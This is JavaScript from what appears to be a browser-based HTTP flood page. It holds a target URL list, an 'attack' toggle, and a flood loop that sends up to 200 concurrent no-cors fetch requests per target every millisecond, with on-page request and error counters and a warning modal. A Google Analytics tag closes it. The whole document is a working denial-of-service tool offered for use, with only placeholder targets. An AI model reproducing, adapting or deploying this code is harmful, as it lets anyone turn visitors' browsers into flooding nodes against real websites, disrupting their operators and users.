 // target list
        var urls = [
            'http://example.ru/',
            'https://0.0.0.0:443/',
            'http://0.0.0.0:80/',
        ];

        // initialize variables
        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
        var statRow = document.querySelector("#stats > .row");
        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
        var CONCURRENCY_LIMIT = 200;
        var queue = [];
        var attack = false;
        var totalrequests = 0;
        var totalerrors = 0;

        function togglePause () {
            if (attack) {
                attack = false;
                document.querySelector("div.desc .btn").innerText = "Resume";
            } else {
                attack = true;
                document.querySelector("div.desc .btn").innerText = "Pause";
                for (var i=0; i<urls.length; i++) {
                    flood(i);
                }
            }
        }

        async function fetchWithTimeout(resource, options) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), options.timeout);
            return fetch(resource, {
                signal: controller.signal,
                mode: 'no-cors'
            }).then((response) => {
                clearTimeout(id);
                return response;
            }).catch((error) => {
                clearTimeout(id);
                throw error;
            });
        }

        async function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }         

        async function flood(n) {
            const url = urls[n];
            const target = targets[url];

            while (attack) {
                if (queue.length > CONCURRENCY_LIMIT) {
                    await queue.shift();
                }
                queue.push(
                    fetchWithTimeout(url, { timeout: 2000 })
                        .catch((error) => {
                            if (error.code === 20 /* ABORT */) {
                                return;
                            }
                            target.number_of_errored_responses++;
                            target.error_message = error.message;
                            totalerrors++;
                        })
                        .then((response) => {
                            if (response && !response.ok) {
                                target.number_of_errored_responses++;
                                target.error_message = response.statusText;
                                totalerrors++;
                            }
                            target.number_of_requests++;
                        })
                        .finally(() => updateTargetDisplay(n))
                );

                await sleep(1);
            }
        }

        // Update data for target n
        function updateTargetDisplay(n) {
            var url = urls[n];
            var {number_of_requests, number_of_errored_responses} = targets[url];
            var requests_cell = document.querySelector(`#target${n} .requests`);
            var errors_cell = document.querySelector(`#target${n} .errors`);
            requests_cell.innerText = number_of_requests;
            errors_cell.innerText = number_of_errored_responses;
            document.querySelector("#totalrequests").innerText = totalrequests;
            document.querySelector("#totalerrors").innerText = totalerrors;
        }

        // Shuffle array order before starting
        for (let i = urls.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [urls[i], urls[j]] = [urls[j], urls[i]];
        }

        // Create div for each target
        for (var i=0; i<urls.length; i++) {
            statRow.innerHTML += `
                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
                    <h4>${urls[i]}</h4>
                    <table class='status'>
                        <tr><td>requests:</td><td class="requests">0</td></tr>
                        </tr><td>errors:</td><td class="errors">0</td></tr>
                    </table>
                </div>
            `;
        }

        // Show warning window
        myModal.toggle();

    
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-85513613-1');
